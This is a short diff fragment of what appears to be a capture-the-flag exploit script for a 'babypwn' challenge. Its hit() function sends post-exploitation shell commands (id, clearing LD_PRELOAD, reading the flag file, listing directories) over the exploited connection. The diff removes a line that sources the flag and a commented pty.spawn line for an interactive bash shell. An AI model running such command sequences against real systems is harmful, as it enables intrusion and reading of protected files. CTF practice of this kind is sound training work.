@@ -46,8 +46,6 @@ def hit():
     cmd = 'id;LD_PRELOAD='';'
     cmd += 'cat /opt/ctf/babypwn/home/flag;'
     cmd += 'ls -al /opt/ctf/babypwn/home/;'
-    cmd += 'source /opt/ctf/babypwn/flag.txt 2>&1;'
-    #cmd += 'python -c \'import pty; pty.spawn("/bin/bash")\''
     y.sendline( cmd )
     print y.recv( 2048 )
 
